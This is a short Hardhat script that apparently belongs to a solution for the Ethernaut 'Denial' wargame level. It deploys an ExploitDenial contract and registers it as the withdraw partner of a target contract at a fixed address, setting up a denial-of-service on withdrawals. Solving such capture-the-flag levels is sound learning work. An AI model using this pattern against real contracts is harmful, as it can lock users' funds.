import { ethers } from 'hardhat'
import { Denial } from '../types/typechain/Denial'
import { ExploitDenial } from '../types/typechain/ExploitDenial'

async function main() {
  const targetAddr = '0x30D468212A9855eA9080DF1240c922Cd95C1607c'

  const targetFac = await ethers.getContractFactory('Denial')
  const target = targetFac.attach(targetAddr) as Denial

  const exploitFac = await ethers.getContractFactory('ExploitDenial')
  const exploit = (await exploitFac.deploy()) as ExploitDenial

  await exploit.deployed()
  console.log(exploit.address)
  console.log('Exploit deployed, linking to target ...')
  await target.setWithdrawPartner(exploit.address)
  console.log('Linking successfull, ready to execute withdraw')
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
